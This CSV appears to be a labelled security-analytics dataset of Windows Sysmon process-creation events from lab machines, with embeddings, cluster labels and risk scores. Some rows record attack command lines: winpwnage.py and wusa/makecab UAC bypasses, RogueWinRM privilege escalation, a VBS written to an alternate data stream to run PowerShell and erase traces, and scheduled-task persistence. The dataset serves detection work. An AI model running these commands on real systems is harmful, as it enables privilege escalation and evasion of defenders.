2020-04-25T22:19:27.855101Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s IKEEXT,"[ 0.00756519  0.04209355  0.00980204 ...  0.03520706 -0.00347485
 -0.004154  ]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.970533Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k NetworkService -p -s CryptSvc,"[-0.00417565  0.03024212  0.00570326 ...  0.03357405  0.00772178
 -0.00302493]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:28.014998Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k utcsvc -p,"[-0.00193923  0.02720316  0.02091796 ...  0.02132617 -0.00446504
 -0.00130309]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:28.063356Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p -s DPS,"[ 0.00117383  0.0229306   0.02407333 ...  0.02511328 -0.00593371
 -0.00477106]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:28.065530Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s LanmanServer,"[-0.00816811  0.03134413  0.00845835 ...  0.03081146  0.00125308
  0.00462752]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:28.068155Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalService -p -s SstpSvc,"[-0.00212943  0.02556471  0.00581236 ...  0.03562915 -0.00758754
 -0.00135073]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:28.080717Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,c:\Program Files\vulnsvc\mmm.exe,"[-0.0078564   0.0234657   0.00872652 ...  0.03155384 -0.01208132
 -0.00971953]",98,110,"Execution of suspicious binaries from temporary, redirected, or non-standard directories, including native process injection via mavinject.exe and Atomic Red Team testing frameworks.",10
2020-04-25T22:19:28.086837Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s WpnService,"[-0.00809372  0.02667511  0.0131258  ...  0.03196251 -0.00019934
  0.00171029]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:28.096049Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TrkWks,"[-0.0014655   0.03077831  0.02836814 ...  0.0062289  -0.00971341
 -0.00255601]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:28.465652Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalService -p -s WdiServiceHost,"[-0.00673773  0.0218562   0.01562884 ...  0.02648706 -0.00360224
 -0.0034472 ]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:32.050869Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,sihost.exe,"[ 0.00632118  0.01834611  0.02302646 ...  0.01883992  0.00203489
 -0.002099  ]",115,166,Standard Windows system processes related to user shell infrastructure and accessibility management.,1
2020-04-25T22:19:32.058331Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc,"[ 0.01481767  0.01647104  0.0118952  ...  0.02662536 -0.00150972
 -0.01325215]",0,251,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:32.097570Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService,"[-0.00648529  0.01644604  0.01629629 ...  0.02906292  0.00043135
 -0.00620673]",0,251,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:37.209189Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh","[-0.03175503  0.00602018  0.0090257  ...  0.01098856  0.01566308
 -0.00919913]",111,190,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2020-04-25T22:19:40.692924Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo,"[ 0.00363176  0.02884284  0.02051351 ...  0.02189914 -0.01101781
 -0.0044062 ]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:20:11.402474Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,consent.exe 6964 318 0000021FF2606500,"[-0.01421143  0.00462088  0.03001047 ... -0.00138301 -0.0132747
  0.00364723]",75,183,Execution of the Windows User Account Control (UAC) consent UI for privilege elevation requests.,3
2020-04-25T22:20:16.073653Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\BGinfo\BGINFO.EXE"" /accepteula /ic:\bginfo\bgconfig.bgi /timer:0",[0.00391049 0.01340484 0.01594479 ... 0.0014259  0.00385566 0.00189588],120,264,"This cluster indicates high-risk activity including system discovery, potential privilege escalation via Utility Manager, living-off-the-land execution with MSBuild, and explicit EDR alerts for renamed signed binary proxies and driver loading.",9
2020-04-25T22:20:16.165482Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\SecurityHealthService.exe,"[-0.02028276  0.03869129  0.01588455 ...  0.01956567 -0.00275526
 -0.0083861 ]",0,132,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:20:16.965344Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\19.232.1124.0012\FileCoAuth.exe -Embedding,[0.01557616 0.03038504 0.01187161 ... 0.00125525 0.00583139 0.01176618],72,175,Standard Microsoft OneDrive File Co-Authoring process executions initiated via COM embedding.,1
2020-04-25T22:20:18.975199Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /background","[ 0.02629635  0.03489697  0.02054737 ...  0.01036129  0.00744903
 -0.01032232]",111,175,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2020-04-25T22:20:21.251393Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\regedit.exe"" ","[-0.00589106  0.00042961  0.00819008 ...  0.01453368 -0.0073708
  0.00799906]",0,210,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:20:21.263232Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,consent.exe 6964 258 0000021FF266EC20,"[-0.01892964  0.01124958  0.0067538  ...  0.00115443 -0.01162688
 -0.00271037]",75,183,Execution of the Windows User Account Control (UAC) consent UI for privilege elevation requests.,3
2020-04-25T22:21:08.564350Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p -s SSDPSRV,"[ 2.6600827e-03  2.2978150e-02  2.0954409e-03 ...  3.9036520e-02
 -4.5984230e-03  7.6326660e-06]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:21:18.412316Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k NetworkService -p,"[ 0.00895593  0.03397568  0.01344225 ...  0.0263417  -0.00945551
  0.00340865]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:21:19.340027Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k NetworkService -p -s WinRM,"[-0.00058619  0.02238436  0.00698361 ...  0.02725638 -0.00522065
 -0.00041678]",0,3,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:21:19.629630Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s wscsvc,"[-0.01159326  0.03350218  0.02352963 ...  0.02941337 -0.00918339
  0.00176611]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-05-24T01:13:47.756141Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,RogueWinRM.exe  -p c:\Windows\System32\cmd.exe,"[-0.00354952  0.03199207  0.02132333 ... -0.00399312 -0.00270223
  0.00360309]",94,233,Execution of known privilege escalation tools targeting service accounts to obtain SYSTEM level access.,10
2020-05-24T01:13:48.864512Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,[0.0043812  0.0294898  0.01112236 ... 0.02838824 0.00393474 0.00300263],0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-09T02:52:18.844013Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\makecab.exe"" C:\Users\IEUser\AppData\Local\Temp\wscript.exe.manifest C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp ",[0.01035125 0.0114593  0.02773369 ... 0.03023765 0.00215828 0.01010202],76,196,Potential UAC bypass and privilege escalation via makecab and wusa extraction to protected system directories.,9
2019-05-09T02:52:18.922138Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet","[-0.00135235  0.00998179  0.02744711 ...  0.02790649  0.00689068
 -0.00376494]",76,143,Potential UAC bypass and privilege escalation via makecab and wusa extraction to protected system directories.,9
2019-05-09T02:52:18.953388Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\wusa.exe"" ""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windows /quiet","[-0.00097596  0.01262088  0.02817272 ...  0.02532861  0.00254846
 -0.00282517]",76,143,Potential UAC bypass and privilege escalation via makecab and wusa extraction to protected system directories.,9
2019-05-09T02:52:21.250263Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\makecab.exe"" C:\Windows\System32\wscript.exe C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp ",[0.01728187 0.02283049 0.02702856 ... 0.02781889 0.00525924 0.01120608],76,196,Potential UAC bypass and privilege escalation via makecab and wusa extraction to protected system directories.,9
2019-05-09T02:52:21.265888Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet","[-0.00071874  0.01345141  0.02927798 ...  0.02729615  0.00647613
 -0.00115415]",76,143,Potential UAC bypass and privilege escalation via makecab and wusa extraction to protected system directories.,9
2019-05-09T02:52:21.281513Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\wusa.exe"" ""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet","[-0.00090236  0.01650032  0.02965398 ...  0.02425177  0.00326617
 -0.00052368]",76,143,Potential UAC bypass and privilege escalation via makecab and wusa extraction to protected system directories.,9
2019-05-09T02:52:23.500263Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe""  /C ""echo Dim objShell:Dim oFso:Set oFso = CreateObject(""Scripting.FileSystemObject""):Set objShell = WScript.CreateObject(""WScript.Shell""):command = ""powershell.exe"":objShell.Run command, 0:command = ""C:\Windows\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del C:\Windows\wscript.exe&&del C:\Windows\wscript.exe.manifest"""""""""":objShell.Run command, 0:Set objShell = Nothing > ""C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""""",[0.00341087 0.0223531  0.01482417 ... 0.0191762  0.0078062  0.00766685],0,185,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-09T02:52:23.531513Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe""  /C ""C:\Windows\wscript.exe ""C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""""",[0.01796065 0.02471033 0.01665967 ... 0.01911176 0.00193691 0.00622257],0,185,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-10T13:49:29.586782Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll,"[ 0.00330275  0.01272154  0.00699311 ...  0.01504512  0.00570148
 -0.00650048]",48,80,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-10T13:49:39.930532Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wusa.exe"" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32 /quiet","[ 0.00773213  0.01155493  0.02675875 ...  0.02317236  0.00691713
 -0.00221827]",76,71,Potential UAC bypass and privilege escalation via makecab and wusa extraction to protected system directories.,9
2019-05-10T13:49:45.133657Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cliconfg.exe"" ","[-0.00349937  0.00883802  0.0219773  ...  0.00334987 -0.01570127
 -0.00121071]",0,63,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-27T22:43:41.424255Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Downloads\UACBypass.exe"" ","[ 0.01689481  0.01453587  0.02448569 ...  0.01293707 -0.00358198
 -0.00963615]",68,121,Execution of privilege escalation tools including COM hijacking and UAC bypass from the Downloads directory followed by automated cleanup.,10
2019-07-27T22:43:42.033042Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows \System32\winSAT.exe"" formal","[-0.01440796  0.01658899  0.02933032 ...  0.00955476  0.00367073
 -0.01360808]",111,113,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2019-07-27T22:43:42.161809Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,consent.exe 6820 324 0000022557280720,"[-0.00957052  0.008622    0.01340042 ... -0.00589334  0.00024016
 -0.00187803]",119,244,Standard Windows User Account Control (UAC) elevation prompts handled by consent.exe.,2
2019-05-10T12:21:57.077543Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u uac -i 7 -p c:\Windows\System32\cmd.exe,"[ 0.00501327  0.01664006  0.01390242 ...  0.00409777 -0.0035522
 -0.00579479]",48,125,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-10T12:22:08.465096Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""c:\users\ieuser\appdata\local\temp\system32\mmc.exe"" ""c:\users\ieuser\appdata\local\temp\system32\perfmon.msc""","[ 0.00117814  0.02377898  0.02890182 ...  0.01833089 -0.00407852
 -0.00264782]",96,152,"Execution of system management consoles and monitoring tools from non-standard temporary directories, indicative of UAC bypass or directory masquerading.",9
2019-05-10T13:32:48.200716Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u uac -i 9 -p c:\Windows\System32\cmd.exe,"[ 0.00824281  0.01854551  0.01777345 ...  0.00872037 -0.00452033
 -0.00938744]",48,125,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-10T13:32:58.549885Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""c:\Windows\System32\cmd.exe"" ","[-0.00064567  0.02875318  0.02206661 ...  0.01355013 -0.00783812
  0.00694837]",0,69,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-10T13:33:29.424885Z,IEWIN7,Microsoft-Windows-Sysmon,1,whoami  /priv,"[-0.02972444  0.00135504  0.01414445 ...  0.00721109 -0.01896826
 -0.00591159]",0,171,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-04-30T07:46:15.215239Z,IEWIN7,Microsoft-Windows-Sysmon,1,cmd.exe /c echo msdhch > \\.\pipe\msdhch,"[-0.01044919  0.02211505  0.01511196 ...  0.00534319 -0.02702218
  0.00036304]",114,195,"Command cluster indicating network reconnaissance, lateral movement via SSH tunneling and SharpRDP, and post-exploitation activity including named pipe manipulation.",9
2019-05-09T02:07:51.131697Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\sdclt.exe"" /kickoffelev ","[-0.01330247  0.01383769  0.01382643 ... -0.00253258 -0.00856574
 -0.00598536]",77,253,Execution of Windows Backup utility (sdclt.exe) with parameters often associated with UAC bypass techniques.,8
2019-05-09T02:08:00.446150Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\cmd.exe"" /c notepad.exe",[0.00193527 0.02771427 0.01521744 ... 0.00752012 0.0041806  0.01138938],0,61,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-09T01:59:29.090897Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","[ 0.00417952  0.01419023  0.02298853 ...  0.01569203  0.00172399
 -0.00157451]",0,18,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T00:32:24.461387Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u elevate -i 4 -p c:\Windows\System32\cmd.exe,"[ 0.00268844  0.01913706  0.01831256 ...  0.00429288 -0.01283958
 -0.00097989]",48,233,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-12T00:32:30.211387Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\schtasks.exe"" /create /xml c:\users\ieuser\appdata\local\temp\elevator.xml /tn elevator","[ 0.0009659   0.01753505  0.01899676 ...  0.00630152  0.01340171
 -0.01002694]",78,94,"Persistence and execution via scheduled task creation, manual triggering, and deletion using XML configuration files located in temporary directories.",8
2019-05-12T00:32:35.258262Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\schtasks.exe"" /run /tn elevator","[-0.01643238  0.00764791  0.00570965 ... -0.00330455  0.01643078
 -0.00808931]",78,211,"Persistence and execution via scheduled task creation, manual triggering, and deletion using XML configuration files located in temporary directories.",8
